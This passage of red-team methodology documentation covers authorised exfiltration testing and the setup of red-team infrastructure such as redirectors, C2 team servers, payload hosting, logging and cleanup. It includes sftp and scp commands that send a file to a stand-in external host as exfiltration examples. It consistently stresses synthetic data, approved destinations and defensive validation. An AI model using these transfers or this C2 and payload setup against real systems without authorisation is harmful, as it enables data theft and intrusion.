Did DNS security inspect the domain?

Did the SIEM receive the event?

Was an alert generated?

docs.title: DNS Volume Testing
docs.text:
If DNS analytics are an engagement objective, use customer-approved synthetic labels and conservative volumes.

Do not attempt to optimise:

Encoding density

Query timing

Domain-generation patterns

Detection avoidance

The goal is defensive validation, not covert-channel optimisation.

docs.title: Cloud Storage Exfiltration
docs.text:
Cloud storage can provide an outbound transfer path.

Examples include:

Amazon S3

Azure Blob Storage

Google Cloud Storage

Testing should use:

Customer-controlled bucket/container

Red-team-controlled approved account

Synthetic data

Temporary credentials

Logging enabled

docs.text:
Target Host
     |
     v
Cloud API
     |
     v
Approved Storage
     |
     v

docs.title: Cloud Questions
docs.text:
Ask:

Can the endpoint reach the cloud service?

Is authentication required?

Is the service permitted by proxy policy?

Does CASB/SSE inspect the activity?

Does DLP inspect uploads?

Are cloud API operations logged?

Can the SOC identify the source?

docs.title: SaaS Exfiltration
docs.text:
Potential SaaS channels include:

Enterprise document platforms

Collaboration platforms

Approved file-sharing platforms

Webmail

Source-code platforms

Do not use a personal account to test SaaS exfiltration.

Use a customer-approved test tenant or destination.

docs.title: Email Exfiltration
docs.text:
Email can transfer information outside the organisation.

Testing should use:

Synthetic attachment

Approved sender

Approved recipient

Defined file size

Customer-controlled mailbox

Do not email production-sensitive information to prove the control.

docs.title: Email Test Example
docs.text:
Sender:
redteam-test@corp.example

Recipient:
approved-redteam@example.com

Subject:
Authorised Exfiltration Validation EXFIL-007

Attachment:
redteam-synthetic-data.csv

Record:

Mail gateway result

DLP result

Delivery result

SIEM event

SOC response

docs.title: Email DLP
docs.text:
Possible controls include:

Content classification

Attachment inspection

Sensitive-information types

Recipient restrictions

Domain restrictions

Mail-flow rules

A synthetic dataset can be designed to match an approved test policy.

docs.title: File Transfer Protocols
docs.text:
Organisations may permit:

SFTP

SCP

FTPS

Managed file transfer

The important question is whether the channel is:

Expected

Authenticated

Restricted

Monitored

Approved

Do not introduce unapproved external file-transfer infrastructure.

docs.title: SFTP Validation
docs.text:
For an explicitly approved destination:

sftp redteam@example.com

Use a synthetic test file and normal approved authentication.

docs.title: SCP Validation
docs.text:
For an approved test server:

scp redteam-exfil-test.bin redteam@example.com:/approved/redteam/

This is appropriate only when SSH transfer is explicitly included in the test plan.

docs.title: Existing Application Channels
docs.text:
An application may already support:

File upload

File export

Webhook

Email

API calls

Cloud integration

Report delivery

These existing business channels may provide more realistic exfiltration tests than introducing a new protocol.

docs.title: Application Export Testing
docs.text:
Example:

Compromised Application Account
            |
            v
       Export Feature
            |
            v
       Synthetic Data
            |
            v
      External Delivery

Validate:

Authorisation

DLP

Application audit

Proxy

SIEM

SOC response

docs.title: C2 and Exfiltration
docs.text:
A command-and-control channel can theoretically transport collected information.

However, C2 testing and exfiltration testing should remain conceptually separate.

See:

Command and Control

The engagement should define whether:

C2 transport is tested only for tasking

or:

C2 transport is also approved for synthetic data transfer

docs.title: Exfiltration Over C2
docs.text:
If approved, use:

Small synthetic files

Defined maximum volume

Known timestamps

Controlled destination

Full logging

Avoid transferring real sensitive data.

docs.title: Staging
docs.text:
Collection often precedes exfiltration.

Collection
    |
    v
Staging
    |
    v
Archive
    |
    v
Exfiltration

See:

Collection

docs.text:
Before transfer record:

Filename

Size

Hash

Classification

Source

Destination

Test ID

docs.title: Archive Testing
docs.text:
Synthetic test data may be archived before transfer.

Windows:

Compress-Archive -Path "C:\RedTeamStaging\TestData\*" -DestinationPath "C:\RedTeamStaging\exfil-test.zip"

Linux:

tar -czf exfil-test.tar.gz redteam-testdata/

Record the archive hash.

docs.title: Windows Archive Hash
docs.text: Get-FileHash -Algorithm SHA256 "C:\RedTeamStaging\exfil-test.zip"

docs.title: Linux Archive Hash
docs.text: sha256sum exfil-test.tar.gz

docs.title: Archive Detection
docs.text:
Archive creation may itself be detectable.

Potential telemetry includes:

Process creation

File creation

EDR behavioural analytics

DLP

Filesystem telemetry

This allows separate validation of:

Collection/Staging Detection

and:

Network Exfiltration Detection

docs.title: Transfer Size
docs.text:
Record exact transfer size.

Windows:

(Get-Item "C:\RedTeamStaging\redteam-exfil-test.bin").Length

Linux:

stat -c '%s' redteam-exfil-test.bin

docs.title: Volume-Based Testing
docs.text:
If the engagement specifically tests transfer-volume controls, use progressive synthetic sizes.

Example:

100 KB

1 MB

5 MB

10 MB

Do not immediately generate large transfers.

docs.title: Progressive Testing Model
docs.text:
Small Marker
     |
     v
Detected?
   /      \
 Yes       No
 |          |
Record      v
       Small File
           |
           v
       Detected?
        /     \
      Yes      No
      |         |

          Larger Test

Stop once the objective is demonstrated.

docs.title: Bandwidth Safety
docs.text:
Exfiltration tests should not:

Saturate production links

Interfere with backups

Impact business applications

Create unexpected cloud costs

Trigger storage exhaustion

Define maximum:

File size

Total bytes

Requests

Transfer rate

Test duration

docs.title: Egress Filtering
docs.text:
A mature environment may restrict outbound traffic according to:

Source network

Destination

Port

Protocol

Application

User

Device identity

URL category

docs.title: Egress Testing Questions
docs.text:
Ask:

Can servers directly access the internet?

Can workstations directly access the internet?

Must traffic use a proxy?

Are unknown destinations blocked?

Are uncommon ports blocked?

Are DNS requests restricted to approved resolvers?

Can cloud-storage services be reached?

Are uploads inspected?

docs.text:
Servers often require stricter outbound policy than workstations.

A useful security boundary is:

Server
  |
  v
Approved Proxy / Gateway
  |
  v
Approved Destinations

Unexpected unrestricted server egress may increase the impact of a server compromise.

Direct external DNS should normally be restricted where architecture permits.

docs.title: Accurate Reporting
docs.text:

All company data can be exfiltrated.

when the test only demonstrated:

A 1 MB synthetic file could be transferred over HTTPS from one
tested server.

The assessment confirmed that the tested application server
could transfer a 1 MB synthetic file to the approved external
HTTPS destination. The assessment did not transfer production
customer data or perform high-volume exfiltration testing.

docs.title: Example Finding - Unrestricted Server Egress
docs.text:
Title:
Application Servers Permit Unrestricted Direct Internet Egress

Observation:
During the authorised exfiltration test, the compromised
application server established a direct outbound HTTPS
connection to the approved red team destination.

The connection did not require the organisation's authenticated
web proxy.

A 1 MB synthetic file was successfully transferred.

Impact:
An attacker who compromises the affected server may be able to
communicate directly with external infrastructure and transfer
information without passing through the organisation's intended
proxy enforcement point.

Recommendation:
Restrict server internet egress to explicitly required
destinations and services. Route required web traffic through
managed inspection controls and monitor unusual outbound
connections from server networks.

docs.title: Example Finding - DLP Visibility Gap
docs.text:
Title:
Synthetic Sensitive Data Upload Is Not Detected by Outbound DLP

Observation:
A customer-approved synthetic document matching the engagement
test classification was uploaded to the authorised external
destination.

The transfer was permitted and no DLP alert was observed during
the agreed validation window.

Proxy telemetry confirmed the transfer.

Impact:
An attacker with access to similarly classified information may
be able to transfer data through the tested channel without
triggering the expected DLP detection.

Recommendation:
Review DLP coverage for the tested protocol and endpoint class.
Validate policy deployment, content inspection, alert forwarding
and SIEM integration using repeatable synthetic test cases.

docs.title: Example Finding - Direct External DNS
docs.text:
Title:
Server Network Permits Direct DNS Resolution Outside Approved Resolvers

Observation:
The assessment identified that systems within the tested server
network could communicate with DNS infrastructure outside the
organisation's intended resolver path.

Validation used only engagement-specific synthetic DNS queries.

Impact:
Direct DNS egress can reduce central DNS visibility and may
provide an additional communication path following server
compromise.

Recommendation:
Restrict outbound DNS to approved organisational resolvers and
monitor attempts to communicate directly with external DNS
services.

docs.title: Example Positive Security Result
docs.text:
Control:
Endpoint DLP

Test:
A customer-approved synthetic classified document was uploaded
to the approved external HTTPS destination.

Result:
The endpoint DLP agent blocked the transfer and generated an
alert containing the source host, user and file classification.

SIEM:
Alert successfully ingested.

SOC:
Analyst triage began within four minutes.

Conclusion:
The tested exfiltration path was successfully prevented and
detected.

docs.title: Core Principle
docs.text:
Exfiltration testing can be reduced to:

Know exactly what security boundary is being tested.

Use synthetic data whenever possible.

Use only approved destinations.

Record the source file hash.

Record the exact transfer size.

Start with the smallest useful test.

Do not optimise for stealth.

Do not transfer real sensitive data unnecessarily.

Validate firewall visibility.

Validate proxy visibility.

Validate DNS visibility.

Validate endpoint visibility.

Validate DLP.

Validate cloud and SaaS audit where relevant.

Confirm SIEM ingestion.

Measure SOC response.

Stop when the objective is proven.

Verify the destination artifact.

Remove temporary artifacts from both sides.

Report exactly what was demonstrated.

Exfiltration is a control test

The purpose of an authorised exfiltration exercise is not to see how much customer data can be removed. The useful question is whether a realistic attacker path can cross the tested egress boundary and whether the organisation can prevent, detect and respond to that behaviour.

Stop when the egress path is proven

If a small synthetic file successfully crosses the intended boundary and provides sufficient evidence for the engagement objective, additional production-data collection or high-volume transfer usually adds risk without improving the finding.

docs.title: Red Team Infrastructure
docs.text:
Red team infrastructure is the collection of systems and services used to support an authorised security assessment.

Depending on the engagement, infrastructure can include:

        v
VPN / Management Network
        |
        v
Team Server
        |

        |                    |
        v                    v

        |                    |
        v                    v
     Internet             Internet
        |                    |
        +---------+----------+
                  |
                  v
         Authorised Targets

Infrastructure should be designed before an engagement begins.

A poorly secured red team server can expose:

Customer information
Credentials
Payloads
Infrastructure addresses
Operator activity
Assessment evidence
Internal network information
C2 configuration
Attack paths

Treat red team infrastructure as sensitive production infrastructure for the duration of the engagement.

docs.text:
A useful infrastructure design follows several principles:

Isolation
Least Privilege
Minimal Exposure
Strong Authentication
Encryption
Logging
Segmentation
Recoverability
Attribution Control
Cleanup

The objective is not simply to make infrastructure difficult to discover.

The infrastructure must also remain secure, controllable, auditable, and removable.

docs.text:

Create administrative user
Configure SSH
Configure firewall
Disable unnecessary services
Configure logging

Configure automatic security updates where appropriate

docs.text:
Avoid routine direct root login where practical.

Create a dedicated administrative account:

Add appropriate administrative privileges where required:

sudo usermod -aG sudo operator

No unnecessary root login
No weak passwords
Modern cryptography
Logging
Rate limiting where appropriate

Generate a dedicated engagement key where required:

ssh-keygen -t ed25519

Example:

ssh-keygen -t ed25519 -f ~/.ssh/redteam-engagement

Connect:

ssh -i ~/.ssh/redteam-engagement operator@SERVER

docs.title: SSH Configuration
docs.text:
Server configuration is commonly located at:

/etc/ssh/sshd_config

Review the effective configuration:

sudo sshd -T

Useful settings to review include:

PermitRootLogin
PasswordAuthentication
PubkeyAuthentication
AllowUsers
AllowGroups
MaxAuthTries
LogLevel

After changing SSH configuration, validate before restarting:

sudo sshd -t

Do not close the existing administrative session until a second session has successfully connected using the new configuration.

docs.title: Firewall
docs.text:
Expose only services required for the engagement.

A simple model:

Internet
   |
   +--> 443/tcp  Redirector
   |
   X--> 22/tcp  Team Server
   |
   X--> Other Management Ports

Administrative access should preferably originate from:

Known operator IP
Management VPN
Bastion
Private cloud network

docs.title: UFW
docs.text:
Example baseline:

sudo ufw default deny incoming

sudo ufw default allow outgoing

Allow SSH from an authorised management address:

sudo ufw allow from 203.0.113.10 to any port 22 proto tcp

Allow HTTPS:

sudo ufw allow 443/tcp

Enable:

sudo ufw enable

Review:

sudo ufw status numbered

Use addresses and ports appropriate for the actual engagement.

docs.title: nftables
docs.text:
Modern Linux systems may use nftables.

Inspect:

sudo nft list ruleset

Also understand whether another firewall manager is generating the ruleset.

Potential managers include:

UFW
firewalld
Docker
Cloud firewall
Provider firewall

docs.title: Cloud Firewall
docs.text:
Do not rely exclusively on the host firewall where the provider supports an external firewall.

A useful layered model is:

Internet
   |
   v
Provider Firewall
   |
   v
Host Firewall
   |
   v
Application

If one layer is accidentally changed, another still limits exposure.

docs.title: Service Exposure
docs.text:
Check listening services:

ss -lntup

Alternative:

sudo ss -lntup

Review:

Listening address
Port
Protocol
Process
Expected exposure
Firewall rule

Unexpected listeners should be investigated.

docs.title: Domain Strategy
docs.text:
Domains can provide stable names for assessment infrastructure.

A simple structure might be:

example-assessment.net
        |
        +--> c2.example-assessment.net
        |
        +--> files.example-assessment.net
        |
        +--> vpn.example-assessment.net
        |
        +--> logs.example-assessment.net

Avoid using production organisational domains for temporary assessment infrastructure unless explicitly planned.

docs.title: DNS
docs.text:
DNS records commonly include:

A
AAAA
CNAME
TXT
MX
CAA

For a basic HTTPS service:

c2.example-assessment.net
        |
        v
A Record
        |
        v
203.0.113.20

Check:

dig c2.example-assessment.net

dig +short c2.example-assessment.net

Alternative:

nslookup c2.example-assessment.net

docs.title: DNS Operational Security
docs.text:
DNS can reveal infrastructure relationships.

Consider whether multiple services unnecessarily resolve to the same address.

Example:

c2.example.net   ----+
files.example.net ---+--> Same VPS
vpn.example.net  ----+

This may be acceptable for a small lab but creates stronger infrastructure correlation.

A more separated architecture might use:

c2.example.net
      |
      v
Redirector A

files.example.net
      |
      v
Redirector B

vpn.example.net
      |
      v
Management Host

docs.title: TLS
docs.text:
Internet-facing HTTP infrastructure should normally use TLS.

Target
   |
   v
HTTPS
   |
   v
Redirector

TLS provides:

Transport encryption
Server authentication
Integrity
Normal HTTPS transport

Certificates should be valid for the configured hostname.

docs.title: Certificate Management
docs.text:
Certificate automation can be performed using tools such as:

Certbot
acme.sh
Caddy
Traefik
Cloud provider certificate services

Certificate renewal should be tested before an engagement starts.

Check certificate information:

openssl s_client -connect example-assessment.net:443 -servername example-assessment.net

docs.title: Redirectors
docs.text:
A redirector separates internet-facing traffic from backend infrastructure.

Authorised Target
       |
       v
   Redirector
       |
       v
   Team Server

Benefits can include:

Backend isolation
Reduced direct exposure
Traffic filtering
Central TLS termination
Logging
Infrastructure replacement
Separation of responsibilities

docs.title: Why Use Redirectors?
docs.text:
Without a redirector:

Target
   |
   v
Team Server

The backend service is directly exposed.

With a redirector:

Target
   |
   v
Redirector
   |
   v
Backend

The backend can be restricted so that only the redirector is permitted to connect to the relevant service.

docs.title: Redirector Security Model
docs.text:
A useful design is:

                    Internet
                       |
                       v
                +-------------+
                | Redirector  |
                +-------------+
                       |
             Restricted Route
                       |
                       v
                +-------------+
                | Team Server |
                +-------------+
                       |
                       v
                Management VPN

The team server should not accept arbitrary internet connections where avoidable.

docs.title: Reverse Proxy
docs.text:
Common reverse-proxy technologies include:

Nginx
Apache
Caddy
HAProxy
Traefik
Cloud load balancers

A reverse proxy can provide:

TLS termination
Request filtering
Access logging
Backend routing
Rate limiting
Header handling
Health checks

docs.title: Nginx Baseline
docs.text:
A minimal generic HTTPS reverse proxy may resemble:

server {
    listen 443 ssl;
    server_name example-assessment.net;

    ssl_certificate /etc/letsencrypt/live/example-assessment.net/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example-assessment.net/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

Validate configuration:

sudo nginx -t

Reload:

sudo systemctl reload nginx

This is only a generic reverse-proxy example. Actual routing depends on the authorised service being proxied.

docs.title: Redirector Filtering
docs.text:
Redirectors can reject traffic that does not match expected engagement characteristics.

Possible controls include:

Allowed paths
Expected methods
Expected Host header
Source restrictions
Request size limits
Rate limits
Known engagement identifiers
Backend authentication

Filtering should be designed carefully so that it does not create an availability issue for legitimate infrastructure.

docs.title: Backend Restriction
docs.text:
The backend should preferably accept operational traffic only from known redirectors.

Conceptually:

Internet
   |
   X
Team Server

Redirector
   |
   v
Team Server

Firewall logic:

ALLOW Redirector -> Backend Port
DENY  Internet   -> Backend Port

docs.title: Command-and-Control Infrastructure
docs.text:
C2 infrastructure is one component of the overall red team infrastructure.

Operator
   |
   v
Team Server
   |
   v
Redirector
   |
   v
Authorised Test Host

The team server may maintain:

Agent state
Tasking
Operator sessions
Assessment metadata
Logs
Configuration

Because of this, the team server should receive stronger protection than a disposable public redirector.

docs.title: C2 Separation
docs.text:
Where practical:

                    Internet
                       |
                       v
                  Redirector
                       |
                       v
                Restricted Port
                       |
                       v
                  Team Server
                       |
                       v
                 Management VPN
                       |
                       v
                    Operator

Avoid exposing the C2 administrative interface directly to the internet.

docs.title: C2 Frameworks
docs.text:
Common authorised security testing and adversary simulation frameworks include:

Cobalt Strike
Sliver
Mythic
Havoc
Metasploit
CALDERA

Each framework has different:

Architecture
Listener models
Agent formats
Authentication
Logging
Network behaviour
Extensibility
Operational requirements

Framework selection should be based on engagement requirements rather than familiarity alone.

docs.title: C2 Is Covered Separately
docs.text:
This infrastructure page focuses on the systems supporting C2.

The dedicated C2 page should cover:

C2 architecture
Team server
Listeners
Agents
Transport
HTTP / HTTPS
DNS concepts
Redirectors
Profiles
Tasking
Sleep and jitter
Operational security
Detection surfaces
Logging
Cleanup
Framework comparison

See:

Command and Control

docs.title: Payload Infrastructure
docs.text:
Payload delivery should preferably be separated from management infrastructure.

Example:

Payload Repository
       |
       v
Payload Server
       |
       v
HTTPS
       |
       v
Authorised Target

The server should expose only the files required for the engagement.

docs.title: Simple HTTP Server
docs.text:
For a temporary lab or controlled transfer:

python3 -m http.server 8000

Bind to a specific interface where appropriate:

python3 -m http.server 8000 --bind 127.0.0.1

For internet-facing engagement infrastructure, a properly configured HTTPS web server is preferable to an unauthenticated temporary development server.

docs.title: Payload Directory
docs.text:
Use a dedicated directory:

/srv/redteam-files/

Example structure:

/srv/redteam-files/
├── tools/
├── scripts/
├── test-files/
└── checksums/

Do not expose:

SSH keys
Operator credentials
Customer evidence
C2 configuration
Internal notes
Source repositories
API tokens

docs.title: File Integrity
docs.text:
Record hashes for important assessment files.

Linux:

sha256sum file.bin

PowerShell:

Get-FileHash .\file.bin -Algorithm SHA256

This helps establish exactly which file was delivered during the assessment.

docs.title: Payload Tracking
docs.text:
Maintain a simple inventory:

File Purpose SHA-256 Target Cleanup Required test.bin Controlled validation <hash> Test host Yes enum.ps1 Enumeration <hash> Test host Yes

Tracking becomes increasingly important during larger engagements.

docs.title: Infrastructure Logging
docs.text:
Infrastructure should produce enough telemetry to reconstruct what occurred.

Potential sources include:

SSH logs
VPN logs
Firewall logs
Nginx logs
Apache logs
C2 logs
System journal
Authentication logs
Cloud audit logs
DNS logs
Provider logs

On systemd systems:

journalctl

SSH events may be available through:

journalctl -u ssh

or:

journalctl -u sshd

depending on the distribution.

docs.title: Web Logs
docs.text:
Nginx commonly stores logs under:

/var/log/nginx/access.log
/var/log/nginx/error.log

Monitor:

sudo tail -f /var/log/nginx/access.log

These logs can help distinguish:

Assessment traffic
Internet scanning
Search-engine crawlers
Automated exploitation
Unexpected third-party traffic

docs.title: Central Logging
docs.text:
For larger engagements:

Redirector A ----+
                 |
Redirector B ----+----> Logging Server
                 |
Payload Host ----+
                 |
Team Server -----+

Centralisation reduces dependence on ephemeral hosts.

docs.title: Time Synchronisation
docs.text:
Accurate timestamps are critical for comparing red team activity with defensive telemetry.

Check:

timedatectl

A useful standard is:

UTC for infrastructure logs
UTC for operator timeline
UTC for evidence

If local time is used, document the timezone explicitly.

docs.title: Operator Timeline
docs.text:
Record significant activity.

Example:

2026-09-05 08:32 UTC
Operator: A
Source: Redirector-01
Target: TEST-WKS-01
Action: Connectivity validation
Result: Successful

This allows blue-team telemetry to be correlated later.

docs.title: Infrastructure Inventory
docs.text:
Maintain an inventory.

Host Role Public IP Management Exposed Services rt-team-01 Team server Restricted VPN Backend only rt-redir-01 C2 redirector Public VPN/SSH 443 rt-files-01 Payload server Public VPN/SSH 443 rt-log-01 Logging Restricted VPN Internal

Avoid storing real passwords in the inventory.

docs.title: Secrets Management
docs.text:
Infrastructure secrets can include:

SSH private keys
VPN keys
API tokens
Cloud credentials
DNS provider tokens
TLS private keys
C2 credentials
Repository tokens

Do not store them directly in source-controlled configuration files.

docs.title: Environment Files
docs.text:
If environment files are required:

.env

Ensure they are excluded from Git:

.env
*.key
*.pem
secrets/
credentials/

Verify:

git status

Also check repository history if a secret was accidentally committed.

docs.title: Repository Security
docs.text:
Red team repositories may contain sensitive operational information.

Repositories should be:

Private where appropriate
Access controlled
Protected with MFA
Free from credentials
Free from customer data
Reviewed before publication

Never assume deleting a secret from the latest commit removes it from repository history.

docs.title: Backups
docs.text:
Infrastructure configuration should be recoverable.

Useful items to back up include:

Firewall configuration
Reverse-proxy configuration
Infrastructure inventory
DNS configuration
C2 configuration
Logging configuration
Deployment scripts

Do not create unnecessary backups of customer-derived sensitive information.

docs.title: Monitoring Infrastructure
docs.text:
Red team infrastructure is exposed to the internet and can itself be attacked.

Monitor:

Unexpected SSH attempts
Unexpected web traffic
Port scanning
Authentication failures
CPU usage
Disk usage
Memory usage
Certificate expiry
Service failures
Unexpected processes
Unexpected listeners

Check processes:

ps aux

Check listening ports:

ss -lntup

docs.title: Health Checks
docs.text:
Simple infrastructure checks can include:

systemctl status nginx

systemctl status ssh

df -h

free -h

uptime

ss -lntup

docs.title: External Validation
docs.text:
After applying firewall rules, verify exposure externally.

For example:

nmap -Pn -p 22,80,443 SERVER

The expected result should match the infrastructure design.

Example:

22/tcp   filtered
80/tcp   closed
443/tcp  open

Do not rely only on local firewall output.

docs.title: Cloud Metadata
docs.text:
If infrastructure runs in a cloud environment, protect cloud credentials and metadata access.

Understand:

Instance roles
Metadata service
API credentials
Security groups
Firewall rules
Snapshots
Object storage
Cloud audit logs
IAM permissions

docs.title: Infrastructure Segmentation
docs.text:
Avoid putting every function on one unrestricted VPS for substantial engagements.

Instead:

              Internet
                 |
          +------+------+
          |             |
          v             v
      Redirector     Payload Host
          |
          v
      Team Server
          |
          v
      Management

Segmentation reduces the consequences of compromise of one component.

docs.title: Small Engagement Architecture
docs.text:
A small authorised lab may reasonably use:

             VPS
              |
      +-------+-------+
      |               |
     SSH             HTTPS
      |               |
 Operator          Test Host

The simpler design is easier to manage but provides less isolation.

docs.title: Medium Engagement Architecture
docs.text:
Internet
                          |
             +------------+------------+
             |                         |
             v                         v
       C2 Redirector              Payload Host
             |
             v
         Team Server
             |
             v
       Management VPN
             |
             v
          Operators

docs.title: Infrastructure Attribution
docs.text:
Infrastructure naturally leaves observable information.

Examples include:

IP addresses
Hosting provider
ASN
Domain registration
DNS history
TLS certificates
HTTP headers
Server banners
Open ports
Favicon hashes
Certificate transparency
Shared infrastructure

This is relevant when assessing how infrastructure may be identified or correlated.

The objective should not be to impersonate unrelated organisations or deceive uninvolved third parties.

docs.title: HTTP Headers
docs.text:
Inspect:

curl -I https://example-assessment.net/

Unnecessary headers can expose:

Server software
Framework
Version information
Proxy technology
Backend behaviour

Reduce unnecessary information where practical.

docs.title: Server Banners
docs.text:
Review:

curl -I https://example-assessment.net/

and:

nmap -sV SERVER

Ensure the exposed services match the intended architecture.

docs.title: Redirector Failure
docs.text:
Plan for redirector loss.

Redirector Fails
      |
      v
DNS Change
      |
      v
Replacement Redirector
      |
      v
Backend Restored

Document enough configuration to rebuild disposable infrastructure quickly.

docs.title: Team Server Failure
docs.text:
Team-server loss can be more serious.

Consider:

Configuration backup
Engagement logs
Operator state
Infrastructure documentation
Recovery procedure
Access credentials

Backups must themselves be protected.

docs.title: Kill Switch
docs.text:
The engagement should have a method to rapidly stop operational infrastructure.

Possible actions include:

Disable listener
Stop redirector
Block backend
Remove DNS record
Revoke credentials
Stop payload hosting
Disable cloud resource

The exact mechanism depends on the architecture.

docs.title: Emergency Shutdown
docs.text:
A simple shutdown model:

Emergency
   |
   v
Stop Operational Services
   |
   v
Block External Traffic
   |
   v
Preserve Required Logs
   |
   v
Notify Engagement Lead
   |
   v
Investigate

docs.title: Cleanup Tracking
docs.text:
Every temporary infrastructure component should have an owner and cleanup requirement.

Example:

Resource Created Purpose Cleanup VPS Yes Redirector Destroy Domain Yes Assessment Review/retire DNS record Yes C2 Remove TLS certificate Yes HTTPS Revoke/expire Firewall rule Yes Management Remove Cloud token Yes Automation Revoke SSH key Yes Administration Revoke/archive appropriately

docs.title: Infrastructure Decommissioning
docs.text:
At the end of an engagement:

Stop operational services
        |
        v
Collect required logs
        |
        v
Remove assessment files
        |
        v
Revoke temporary credentials
        |
        v
Remove DNS records
        |
        v
Remove firewall exceptions
        |
        v
Destroy temporary servers
        |
        v
Verify cleanup

docs.title: Evidence Retention
docs.text:
Retain only information required by:

Engagement agreement
Reporting requirements
Legal requirements
Customer policy
Evidence policy

Sensitive material should not remain indefinitely on disposable infrastructure.

docs.title: Planning
docs.text:
• Infrastructure requirements defined
  • Engagement scope reviewed
  • Required services identified
  • Hosting provider selected
  • Domains prepared
  • DNS plan prepared
  • Logging requirements defined
  • Cleanup process defined

docs.title: VPS
docs.text:
• Operating system updated
  • Administrative account created
  • SSH hardened
  • Root login policy reviewed
  • Password authentication policy reviewed
  • Unnecessary services disabled
  • Time synchronisation verified

docs.title: Firewall
docs.text:
• Default-deny inbound policy considered
  • Management ports restricted
  • Public services explicitly allowed
  • Provider firewall configured
  • Host firewall configured
  • External exposure verified

docs.title: DNS and TLS
docs.text:
• DNS records correct
  • TLS certificates valid
  • Certificate renewal tested
  • Backend addresses not unnecessarily exposed
  • DNS relationships reviewed

docs.title: Redirectors
docs.text:
• Redirector isolated from backend
  • Backend restricted to redirector
  • TLS configured
  • Access logging enabled
  • Filtering reviewed
  • Recovery procedure documented

docs.title: C2
docs.text:
• Team server restricted
  • Administrative interface protected
  • Operator authentication configured
  • Redirector architecture verified
  • C2 logs protected
  • Emergency stop procedure documented

docs.title: Payload Hosting
docs.text:
• Dedicated directory used
  • Only required files exposed
  • File hashes recorded
  • Customer evidence excluded
  • Cleanup inventory maintained

docs.title: Logging
docs.text:
• SSH logging available
  • Firewall logging considered
  • Web logs enabled
  • C2 logs retained as required
  • Clock synchronisation verified
  • Operator timeline maintained

docs.title: Secrets
docs.text:
• Secrets excluded from Git
  • SSH keys protected
  • API tokens protected
  • DNS credentials protected
  • Cloud credentials protected
  • Temporary credentials tracked

docs.title: Cleanup
docs.text:
• Temporary accounts removed
  • Temporary keys revoked
  • DNS records removed
  • Firewall exceptions removed
  • Payloads removed
  • Required logs collected
  • VPS instances destroyed where appropriate
  • Cleanup verified

docs.title: Infrastructure Decision Model
docs.text:
Engagement
                        |
                        v
               Infrastructure Needed?
                   /           \
                 No             Yes
                 |               |
                 |               v
                 |        Determine Services
                 |               |
                 |               v
                 |        Publicly Exposed?
                 |          /         \
                 |        No           Yes
                 |        |             |
                 |        |             v
                 |        |        Redirector?
                 |        |          /      \
                 |        |        No        Yes
                 |        |        |          |
                 |        +--------+----------+
                 |                 |
                 |                 v
                 |           Firewall Rules
                 |                 |
                 |                 v
                 |            TLS / DNS
                 |                 |
                 |                 v
                 |             Logging
                 |                 |
                 |                 v
                 |             Validate
                 |                 |
                 +-----------------+
                                   |
                                   v
                              Engagement
                                   |
                                   v
                                Cleanup

docs.title: Final Infrastructure Model
docs.text:
A mature infrastructure design can be represented as:

                    Operators
                        |
                        v
                Management VPN
                        |
                        v
                  Team Server
                        |
              +---------+---------+
              |                   |
              v                   v
       C2 Redirector        Logging System
              |
              v
           Internet
              |
              v
       Authorised Target


Security Controls

Management:
    Restricted access
    Strong authentication
    SSH keys
    VPN

Network:
    Provider firewall
    Host firewall
    Segmentation

Transport:
    TLS
    Valid certificates

Operations:
    Logging
    Monitoring
    Timeline
    Inventory

Recovery:
    Configuration backup
    Replacement infrastructure
    Kill switch

End of Engagement:
    Revoke
    Remove
    Destroy
    Verify
